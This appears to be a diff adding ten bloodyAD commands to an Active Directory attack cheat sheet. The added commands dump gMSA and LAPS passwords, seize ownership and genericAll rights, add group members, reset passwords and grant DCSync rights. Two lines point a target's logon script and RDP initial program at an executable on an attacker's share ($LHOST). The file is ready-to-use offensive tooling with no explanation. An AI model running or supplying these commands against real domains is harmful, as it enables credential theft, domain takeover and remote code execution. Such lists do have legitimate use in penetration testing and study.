@@ -16,3 +16,13 @@ bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$T
 bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_OBJECT" --attr msDS-ManagedPassword
 bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
 bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET\$" --attr msDS-ManagedPassword
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET" "$NEW_OWNER"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET" "$USER"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$USER"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$LHOST\\share\\file.exe"
+bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$LHOST\\share\\file.exe"
